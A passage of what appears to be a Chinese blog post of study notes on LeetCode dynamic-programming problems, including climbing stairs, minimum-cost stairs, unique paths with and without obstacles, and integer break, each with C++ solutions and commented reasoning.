动态规划</span></span><br><span class="line"><span class="comment">    dp[i]表示 爬i个台阶 可能的方法总数</span></span><br><span class="line"><span class="comment">    对于 dp[i]：两种情况</span></span><br><span class="line"><span class="comment">        dp[i] = dp[i-1](再跳一下)</span></span><br><span class="line"><span class="comment">        dp[i] = dp[i-2](再跳两下)</span></span><br><span class="line"><span class="comment">    因此，dp[i] = dp[i-1]+dp[i-2]</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0]=0; dp[1]=1; dp[2]=2;</span></span><br><span class="line"><span class="comment">    遍历边界：总共爬n阶</span></span><br><span class="line"><span class="comment">        for(i=3;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">    注意：前面的判断</span></span><br><span class="line"><span class="comment">        if(n&lt;3)</span></span><br><span class="line"><span class="comment">            return n;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滚动数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//vector&lt;int&gt; dp(n+1);</span></span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">int</span> dp[<span class="number">3</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum = dp[<span class="number">1</span>]+dp[<span class="number">2</span>];</span><br><span class="line">            dp[<span class="number">1</span>] = dp[<span class="number">2</span>];</span><br><span class="line">            dp[<span class="number">2</span>] = sum; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="爬楼梯-扩展"><a href="#爬楼梯-扩展" class="headerlink" title="爬楼梯-扩展"></a>爬楼梯-扩展</h3><p><strong>新问题：</strong>一步一个台阶，两个台阶，三个台阶，直到 m个台阶，有多少种方法爬到n阶楼顶。</p><p><strong>背包解决：</strong><br>1阶，2阶，…. m阶就是物品，楼顶就是背包。<br>每一阶可以重复使用，例如跳了1阶，还可以继续跳1阶。<br>问跳到楼顶有几种方法其实就是问装满背包有几种方法。<br>【排列问题】：1、2 步 和 2、1 步都是上三个台阶，但是这两种方法不一样！<br>【完全背包】：每一步可走多次</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123; <span class="comment">// 遍历背包</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">                <span class="keyword">if</span> (i-j &gt;= <span class="number">0</span>) </span><br><span class="line">                    dp[i] += dp[i-j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="746-使用最小花费爬楼梯"><a href="#746-使用最小花费爬楼梯" class="headerlink" title="746 使用最小花费爬楼梯"></a>746 使用最小花费爬楼梯</h3><p>给你一个整数数组 cost ，其中 cost[i] 是从楼梯第 i 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。<br>你可以选择从下标为 0 或下标为 1 的台阶开始爬楼梯。<br>请你计算并返回达到楼梯顶部的最低花费。<br><img src="https://img-blog.csdnimg.cn/7d6cfb0e729d47cd97558cd9a048d702.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]   爬到第i个台阶，需要花费的代价</span></span><br><span class="line"><span class="comment">    dp[0] = 0</span></span><br><span class="line"><span class="comment">    dp[1] = cost[0]</span></span><br><span class="line"><span class="comment">    dp[2] = min(dp[0]+cost[0],dp[1]+cost[1])</span></span><br><span class="line"><span class="comment">    总共cost n个，顶层是第n+1个台阶</span></span><br><span class="line"><span class="comment">    dp[i] = min(dp[i-1]+cost[i-1],dp[i-2]+cost[i-2]);</span></span><br><span class="line"><span class="comment">    分了两种情况，对应从第一个台阶开始跳和从第二个台阶开始跳</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp2</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//从第一个 台阶开始跳</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = cost[<span class="number">0</span>]; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从第二个 台阶开始跳</span></span><br><span class="line">        dp2[<span class="number">1</span>] = <span class="number">0</span>; dp2[<span class="number">2</span>] = cost[<span class="number">1</span>];  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp2[i] = <span class="built_in">min</span>(dp2[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp2[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for(int i=0;i&lt;=n;i++)&#123;</span></span><br><span class="line">          <span class="comment">//  cout&lt;&lt;dp[i]&lt;&lt;&quot; &quot;;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(dp[n],dp2[n]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    之后，发现，不用分两次</span></span><br><span class="line"><span class="comment">    只用dp[0]=0; dp[1]=0;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//初始化，从前两个台阶开始，都是0</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62 不同路径"></a>62 不同路径</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。<br>机器人<strong>每次只能向下或者向右移动一步</strong>。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。<br>问总共有多少条不同的路径？<br><img src="https://img-blog.csdnimg.cn/af2ae70b76d848bf92df604ae032cdb8.png"><br><strong>总共有多少条？而不是求最短的那条！应该考虑所以情况</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]走到i行j列处 【有多少条路径】</span></span><br><span class="line"><span class="comment">    从dp[0][0] 到 dp[m][n]</span></span><br><span class="line"><span class="comment">    要么向右走，要么向下走</span></span><br><span class="line"><span class="comment">    dp[0][0]=0; dp[0][1]=1; dp[1][0]=1; 求 dp[m][n]</span></span><br><span class="line"><span class="comment">    对于dp[i][j]，两种情况到达：</span></span><br><span class="line"><span class="comment">        从左边来：dp[i][j] = dp[i][j-1]</span></span><br><span class="line"><span class="comment">        从上边来：dp[i][j] = dp[i-1][j]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//自己写的！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[m][n];</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">1</span>||n==<span class="number">1</span>)<span class="comment">//我这里必须写上这个的原因是 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>; <span class="comment">//【这里】如果题目m或者n是1的话，根本不能存在[1]项</span></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**这块也根本不需要</span></span><br><span class="line"><span class="comment">        for(int i=1;i&lt;m;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=1;j&lt;n;j++)&#123;</span></span><br><span class="line"><span class="comment">                dp[i][j] = 2;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                cout &lt;&lt; dp[i][j] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简化之后</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));<span class="comment">//这样就相当于全部初始化0了</span></span><br><span class="line">        <span class="comment">//初始化 从0开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//赋第一行：1 n列</span></span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;<span class="comment">//赋第一列：1 m行</span></span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                cout &lt;&lt; dp[i][j] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="63-不同路径-II"><a href="#63-不同路径-II" class="headerlink" title="63 不同路径 II"></a>63 不同路径 II</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish”）。<br>现在考虑网格中<strong>有障碍物</strong>。那么从左上角到右下角将会有多少条不同的路径？<br>网格中的障碍物和空位置分别用 1 和 0 来表示。<br><img src="https://img-blog.csdnimg.cn/70fbe9a4c1d740e1a6a84d7d0ae198a8.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    首先找到障碍物处：dp[i][j]==1处</span></span><br><span class="line"><span class="comment">    障碍物会影响到的地方：</span></span><br><span class="line"><span class="comment">        障碍物右边处：只能从上边来 dp[i][j+1] = dp[i-1][j+1]</span></span><br><span class="line"><span class="comment">        障碍物下边处：只能从左边来 dp[i+1][j] = dp[i+1][j-1]</span></span><br><span class="line"><span class="comment">    其他地方不影响</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//注释的地方都是 我理解有误的地方</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; obstacleGrid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = obstacleGrid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//注意：当起始位置 或者 终点处就是障碍物，结果 是0条</span></span><br><span class="line">        <span class="keyword">if</span>(obstacleGrid[m<span class="number">-1</span>][n<span class="number">-1</span>]==<span class="number">1</span> || obstacleGrid[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(m==<span class="number">1</span> &amp;&amp; n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n &amp;&amp; obstacleGrid[<span class="number">0</span>][i]==<span class="number">0</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//if(obstacleGrid[0][i]==0)</span></span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m &amp;&amp; obstacleGrid[j][<span class="number">0</span>]==<span class="number">0</span>;j++)&#123;</span><br><span class="line">            <span class="comment">//if(obstacleGrid[j][0]==0)</span></span><br><span class="line">                dp[j][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obstacleGrid[i][j]==<span class="number">1</span>)&#123;<span class="comment">//障碍物处</span></span><br><span class="line">                    <span class="comment">//dp[i][j+1] = dp[i-1][j+1];</span></span><br><span class="line">                    <span class="comment">//dp[i+1][j] = dp[i+1][j-1];</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="343-整数拆分"><a href="#343-整数拆分" class="headerlink" title="343 整数拆分"></a>343 整数拆分</h3><p>给定一个正整数 n ，将其拆分为 k 个 正整数 的和（ k &gt;= 2 ），并使这些整数的乘积最大化。<br>返回 你可以获得的最大乘积 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]正整数i拆分之后乘积的最大值</span></span><br><span class="line"><span class="comment">    dp[2]=1 2=1+1 1*1=1</span></span><br><span class="line"><span class="comment">    dp[3]=2 3=1+2 1*2=2 3拆为1和2,2又拆为1和1</span></span><br><span class="line"><span class="comment">    拆i:</span></span><br><span class="line"><span class="comment">        拆成2个数：j*(i-j)</span></span><br><span class="line"><span class="comment">        拆成3个数：j*dp[i-j]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;<span class="comment">//j&lt;=i/2 要想使得乘积最大，j至少也会拆为i/2</span></span><br><span class="line">                <span class="comment">//dp[i] = max(&#123;dp[i],j*(i-j),j*dp[i-j]&#125;);</span></span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], <span class="built_in">max</span>((i - j) * j, dp[i - j] * j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    贪心：数学</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">3</span>) <span class="keyword">return</span> 